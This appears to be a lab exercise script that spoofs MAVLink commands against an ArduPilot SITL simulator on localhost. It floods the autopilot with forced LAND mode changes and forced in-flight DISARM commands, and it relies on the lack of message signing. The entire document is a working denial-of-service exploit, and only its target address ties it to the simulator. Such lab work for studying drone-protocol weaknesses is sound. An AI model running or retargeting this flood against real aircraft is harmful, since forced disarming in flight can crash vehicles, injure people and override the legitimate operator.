"""
MP5 Mission 2 — MAVLink Command Spoofing DoS

Connects to SITL's secondary MAVLink port (TCP 5762) and floods the
autopilot with mode-change and disarm commands. Because default SITL
does not enforce MAVLink message signing, the autopilot accepts these
commands as if they came from the legitimate ground station, overriding
any operator commands within milliseconds.

Usage:
    python3 mavlink_dos.py

Stop with Ctrl+C.
"""

import time
from pymavlink import mavutil

TARGET = 'tcp:127.0.0.1:5762'   # SITL's second MAVLink endpoint
TARGET_SYS = 1                   # autopilot system ID
TARGET_COMP = 1                  # autopilot component ID
LAND_MODE = 9                    # ArduCopter custom_mode for LAND

print(f"[attacker] Connecting to {TARGET} ...")
mav = mavutil.mavlink_connection(TARGET, source_system=255, source_component=190)
mav.wait_heartbeat()
print(f"[attacker] Connected. Heartbeat from system {mav.target_system} comp {mav.target_component}")

print("[attacker] Starting flood: forcing mode LAND repeatedly + DISARM commands")
print("[attacker] Press Ctrl+C to stop")

count = 0
try:
    while True:
        # Spoof a mode-change command: force LAND
        mav.mav.set_mode_send(
            TARGET_SYS,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            LAND_MODE
        )

        # Also spam disarm so the drone cannot stay armed
        mav.mav.command_long_send(
            TARGET_SYS, TARGET_COMP,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,        # confirmation
            0,        # param1: 0 = disarm, 1 = arm
            21196,    # param2: magic disarm-while-flying force code
            0, 0, 0, 0, 0
        )

        count += 2
        if count % 200 == 0:
            print(f"[attacker] sent {count} malicious commands")
        time.sleep(0.01)   # 100 Hz, plenty fast
except KeyboardInterrupt:
    print(f"\n[attacker] Stopped. Total malicious commands sent: {count}")
